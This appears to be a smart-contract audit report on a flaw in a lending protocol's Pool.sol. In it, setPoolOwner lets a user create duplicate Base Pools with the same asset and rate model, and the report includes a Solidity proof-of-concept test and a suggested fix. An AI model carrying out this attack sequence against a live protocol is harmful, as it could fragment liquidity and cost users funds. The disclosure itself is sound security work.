# Users can create duplicate Base Pools by exploiting the setPoolOwner function

### Summary

The breaking uniqueness of the combination of `owner`, `asset` and `rateModelKey` in the `setPoolOwner` function will cause potential liquidity fragmentation and manipulation for the protocol as attackers can create multiple Base Pools with identical parameters by transferring ownership of the pools to themselves.

### Root Cause

In the `setPoolOwner` function of `Pool.sol:616-622`, there is no check to ensure that the combination of `owner`, `asset`, and `rateModelKey` remains unique after ownership transfer.

### Internal pre-conditions

1. Admin needs to deploy the `Pool.sol`.

### External pre-conditions

No external mechanisms exist

### Attack Path

1. The attacker deploys a contract and uses its address as the owner when calling `initializePool()` with specific asset and `rateModelKey` parameters.
2. The attacker then calls `setPoolOwner()` from the deployed contract, transferring the ownership of the pool to their address.
3. The attacker can now initialize additional pools with the same `asset` and `rateModelKey` by using different initial owners and transferring ownership to themselves.

### Impact

The protocol suffers from liquidity fragmentation and an increased risk of rate manipulation.
The users suffer from inefficiencies and potential financial losses.

### PoC

```solidity
    function testIntializePool() public {
        // test constructor
        address poolImpl = address(new Pool());
        Pool testPool = Pool(address(new TransparentUpgradeableProxy(poolImpl, protocolOwner, new bytes(0))));
        testPool.initialize(protocolOwner, 0, 0, address(registry), address(0), 0, 0);
        assertEq(testPool.registry(), address(registry));

        address rateModel = address(new LinearRateModel(1e18, 2e18));
        bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
        vm.prank(protocolOwner);
        registry.setRateModel(RATE_MODEL_KEY, rateModel);

        address attacker = vm.addr(1);
        vm.startPrank(attacker);
        address controlled1 = address(new Controlled(testPool));
        uint256 id1 = testPool.initializePool(controlled1, address(asset1), type(uint128).max, RATE_MODEL_KEY);
        Controlled(controlled1).setPoolOwner(id1, attacker);

        address controlled2 = address(new Controlled(testPool));
        uint256 id2 = testPool.initializePool(controlled2, address(asset1), type(uint128).max, RATE_MODEL_KEY);
        Controlled(controlled2).setPoolOwner(id2, attacker);
        
        address controlled3 = address(new Controlled(testPool));
        uint256 id3 = testPool.initializePool(controlled3, address(asset1), type(uint128).max, RATE_MODEL_KEY);
        Controlled(controlled3).setPoolOwner(id3, attacker);

        assertEq(testPool.ownerOf(id1), attacker);
        assertEq(testPool.ownerOf(id2), attacker);
        assertEq(testPool.ownerOf(id3), attacker);
        vm.stopPrank();
    }
```

### Mitigation

To mitigate this issue, change the `poolId` to `uint256(keccak256(abi.encodePacked(owner, asset, rateModelKey)))` and return it in the `setPoolOwner` function. That ensures the combination of `owner`, `asset`, and `rateModelKey` remains unique after ownership transfer.
